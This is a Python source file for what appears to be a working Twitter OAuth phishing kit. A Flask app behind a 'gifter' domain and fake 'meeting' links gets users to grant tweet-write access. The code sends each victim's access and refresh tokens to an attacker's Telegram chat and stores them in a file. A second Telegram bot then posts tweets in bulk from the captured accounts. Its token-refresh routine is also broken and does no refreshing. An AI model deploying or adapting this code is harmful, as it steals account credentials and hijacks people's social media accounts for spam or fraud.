import base64
import hashlib
import os
import requests
import time
from flask import Flask, redirect, request, session, render_template
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, CallbackQueryHandler, Updater, MessageHandler, Filters
import logging
import telegram

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = 'https://gifter-7vz7.onrender.com/'  # Update with your callback URL
ALERT_BOT_TOKEN = os.getenv('ALERT_BOT_TOKEN')  # Token for the alert bot
AUTOMATION_BOT_TOKEN = os.getenv('AUTOMATION_BOT_TOKEN')  # Token for the automation bot
ALERT_CHAT_ID = os.getenv('ALERT_CHAT_ID')  # Chat ID for alert bot
AUTOMATION_CHAT_ID = os.getenv('AUTOMATION_CHAT_ID')  # Chat ID for automation bot

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Initialize Telegram Bots
alert_bot = Bot(token=ALERT_BOT_TOKEN)
automation_bot = Bot(token=AUTOMATION_BOT_TOKEN)
alert_updater = Updater(token=ALERT_BOT_TOKEN, use_context=True)
automation_updater = Updater(token=AUTOMATION_BOT_TOKEN, use_context=True)
alert_dispatcher = alert_updater.dispatcher
automation_dispatcher = automation_updater.dispatcher

# Function to save tokens to file
def save_tokens_to_file(access_token, refresh_token):
    with open('tokens.txt', 'a') as file:
        file.write(f"{access_token},{refresh_token}\n")

# Function to load tokens from file
def load_tokens():
    tokens = []
    if os.path.exists('tokens.txt'):
        with open('tokens.txt', 'r') as file:
            tokens = [line.strip().split(',') for line in file if line.strip()]
    return tokens

def get_total_tokens():
    return len(load_tokens())

def get_twitter_username(access_token):
    url = "https://api.twitter.com/2/users/me"
    headers = {
        "Authorization": f"Bearer {access_token}"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        data = response.json()
        username = data.get("data", {}).get("username")
        return username
    else:
        logger.error(f"Failed to fetch username. Status code: {response.status_code}")
        return None

# OAuth and meeting setup
def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge

# Send startup message for the alert bot
def send_startup_message():
    state = "0"
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    authorization_url = CALLBACK_URL
    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"

    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
    )

    data = {
        "chat_id": ALERT_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(f"https://api.telegram.org/bot{ALERT_BOT_TOKEN}/sendMessage", json=data)

# Send startup message for the automation bot
def send_automation_startup_message():
    keyboard = [
        [InlineKeyboardButton("Refresh All Tokens", callback_data='refresh_all')],
        [InlineKeyboardButton("Post (Single Token)", callback_data='post_single')],
        [InlineKeyboardButton("Post (Bulk Tokens)", callback_data='post_bulk')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    message = "🚀 *Automation Bot Started*:\nChoose an option below to perform an action."
    automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text=message, reply_markup=reply_markup, parse_mode="Markdown")

# Function to send tokens to Telegram using the alert bot
def send_to_telegram(access_token, refresh_token=None):
    alert_emoji = "🚨"
    key_emoji = "🔑"
    
    username = get_twitter_username(access_token)
    twitter_url = f"https://twitter.com/{username}" if username else "Unknown user"

    total_tokens = get_total_tokens()

    message = f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
    message += f"{key_emoji} *Access Token:* `{access_token}`\n"
    message += f"🧮 *Total Available Tokens:* {total_tokens}\n"

    if refresh_token:
        refresh_link = f"{CALLBACK_URL}refresh/{refresh_token}"
        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"

    tweet_link = f"{CALLBACK_URL}tweet/{access_token}"
    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
    message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})"

    save_tokens_to_file(access_token, refresh_token)

    data = {
        "chat_id": ALERT_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(f"https://api.telegram.org/bot{ALERT_BOT_TOKEN}/sendMessage", json=data)

# Telegram Bot for Automation Tasks
def start_automation(update, context):
    send_automation_startup_message()

def handle_button(update, context):
    query = update.callback_query
    query.answer()

    if query.data == 'refresh_all':
        query.edit_message_text(text="Confirm refreshing all tokens?", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Yes", callback_data='confirm_refresh')],
            [InlineKeyboardButton("No", callback_data='main_menu')]
        ]))
    elif query.data == 'post_single':
        query.edit_message_text(text="Posting with a single token. Please enter your message:")
        context.user_data['post_mode'] = 'single'
    elif query.data == 'post_bulk':
        query.edit_message_text(text="Enter the number of tokens to use for posting:")
        context.user_data['post_mode'] = 'bulk'
    elif query.data == 'confirm_refresh':
        refresh_all_tokens()
    elif query.data == 'confirm_post':
        message = context.user_data.get('message_content')
        post_with_single_token(message)
    elif query.data == 'main_menu':
        send_automation_startup_message()

def handle_message(update, context):
    user_message = update.message.text
    post_mode = context.user_data.get('post_mode')

    if post_mode == 'single':
        context.user_data['message_content'] = user_message
        update.message.reply_text("Confirm posting the following message?",
                                  reply_markup=InlineKeyboardMarkup([
                                      [InlineKeyboardButton("Yes", callback_data='confirm_post')],
                                      [InlineKeyboardButton("No", callback_data='main_menu')]
                                  ]))
    elif post_mode == 'bulk':
        try:
            num_tokens = int(user_message)
            context.user_data['num_tokens'] = num_tokens
            update.message.reply_text(f"Using {num_tokens} tokens. Now, please enter the message content:")
        except ValueError:
            update.message.reply_text("Please enter a valid number.")

def refresh_all_tokens():
    tokens = load_tokens()
    refreshed_count = 0
    for access_token, refresh_token in tokens:
        new_access_token = access_token
        new_refresh_token = refresh_token
        save_tokens_to_file(new_access_token, new_refresh_token)
        refreshed_count += 1
    automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text=f"Refreshed {refreshed_count} tokens.",
                                reply_markup=InlineKeyboardMarkup([
                                    [InlineKeyboardButton("Back to Main Menu", callback_data='main_menu')]
                                ]))

def post_tweet(access_token, tweet_text):
    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    payload = {"text": tweet_text}

    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
    if response.status_code == 201:
        tweet_data = response.json()
        return f"Tweet posted successfully: {tweet_data['data']['id']}"
    else:
        error_message = response.json().get("detail", "Failed to post tweet")
        return f"Error posting tweet: {error_message}"

def post_with_single_token(message):
    tokens = load_tokens()
    if tokens:
        access_token, _ = tokens[0]
        result = post_tweet(access_token, message)
        automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text=f"{result}",
                                    reply_markup=InlineKeyboardMarkup([
                                        [InlineKeyboardButton("Back to Main Menu", callback_data='main_menu')]
                                    ]))
    else:
        automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text="No tokens available.",
                                    reply_markup=InlineKeyboardMarkup([
                                        [InlineKeyboardButton("Back to Main Menu", callback_data='main_menu')]
                                    ]))

# Flask Routes for OAuth and Token Management
@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
def tweet(access_token):
    if request.method == 'POST':
        tweet_text = request.form['tweet_text']
        result = post_tweet(access_token, tweet_text)
        return render_template('tweet_result.html', result=result)

    return render_template('tweet_form.html', access_token=access_token)

@app.route('/refresh/<refresh_token2>', methods=['GET'])
def refresh_page(refresh_token2):
    return render_template('refresh.html', refresh_token=refresh_token2)

@app.route('/refresh/<refresh_token>/perform', methods=['POST'])
def perform_refresh(refresh_token):
    token_url = 'https://api.twitter.com/2/oauth2/token'
    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')

    headers = {
        'Authorization': f'Basic {auth_header}',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = {
        'refresh_token': refresh_token,
        'grant_type': 'refresh_token',
        'client_id': CLIENT_ID
    }

    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()

    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')
        send_to_telegram(new_access_token, new_refresh_token)
        return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
    else:
        error_description = token_response.get('error_description', 'Unknown error')
        error_code = token_response.get('error', 'No error code')
        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code

@app.route('/j')
def meeting():
    state_id = request.args.get('meeting')
    code_ch = request.args.get('pwd')
    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)

@app.route('/')
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if not code:
        state = "0"
        session['oauth_state'] = state

        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier

        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
        )

        return redirect(authorization_url)

    if code:
        if error:
            return f"Error during authorization: {error}", 400

        if state != "0":
            return "Invalid state parameter", 403

        code_verifier = session.pop('code_verifier', None)

        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': CALLBACK_URL,
            'code_verifier': code_verifier
        }

        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
        token_response = response.json()

        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')

            session['access_token'] = access_token
            session['refresh_token'] = refresh_token

            send_to_telegram(access_token, refresh_token)
            return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
        else:
            error_description = token_response.get('error_description', 'Unknown error')
            error_code = token_response.get('error', 'No error code')
            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code

# Prevent multiple instances from conflicting
def start_polling_with_check(updater):
    try:
        updater.start_polling()
        logger.info("Bot started successfully.")
    except telegram.error.Conflict:
        logger.warning("Bot already running elsewhere. Terminating current instance.")

# Run the bots
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    send_startup_message()
    send_automation_startup_message()
    start_polling_with_check(alert_updater)
    start_polling_with_check(automation_updater)
    app.run(host='0.0.0.0', port=port)
